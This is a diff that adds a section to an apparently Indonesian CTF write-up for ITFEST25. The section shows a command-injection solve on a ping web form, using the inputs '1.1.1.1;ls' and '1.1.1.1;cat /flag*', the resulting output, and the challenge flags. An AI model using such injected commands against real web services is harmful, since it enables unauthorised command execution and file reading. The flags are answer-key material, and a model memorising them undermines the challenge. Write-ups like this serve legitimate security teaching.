@@ -172,3 +172,58 @@ tinggal run deh
 ```
 ITFEST25{base64_berulang_ulang_kali}
 ```
+
+## Injection
+
+ini soal web.
+kita dikasi link, berikut penampakannya
+
+
+![alt text](image-1.png)
+
+yah tinggal command injection biasa doang sih.
+kita coba yang basic dulu
+
+```
+1.1.1.1;ls
+
+Ping Results:
+
+                    
+PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
+64 bytes from 1.1.1.1: icmp_seq=1 ttl=56 time=11.9 ms
+64 bytes from 1.1.1.1: icmp_seq=2 ttl=56 time=11.7 ms
+64 bytes from 1.1.1.1: icmp_seq=3 ttl=56 time=11.8 ms
+
+--- 1.1.1.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+rtt min/avg/max/mdev = 11.676/11.775/11.875/0.081 ms
+index.php
+Ping Komedi                
+```
+
+ok karena gada sanitasi tinggal cari flagnya
+
+```
+1.1.1.1;cat /flag*
+
+
+                    
+Ping Results:
+
+                    
+PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
+64 bytes from 1.1.1.1: icmp_seq=1 ttl=56 time=11.8 ms
+64 bytes from 1.1.1.1: icmp_seq=2 ttl=56 time=11.8 ms
+64 bytes from 1.1.1.1: icmp_seq=3 ttl=56 time=12.0 ms
+
+--- 1.1.1.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2002ms
+rtt min/avg/max/mdev = 11.787/11.866/12.018/0.107 ms
+ITFEST25{Command_Injection_Is_Easy_Right??}Ping Komedi        
+
+```
+## Flag
+```
+ITFEST25{Command_Injection_Is_Easy_Right??}
+```
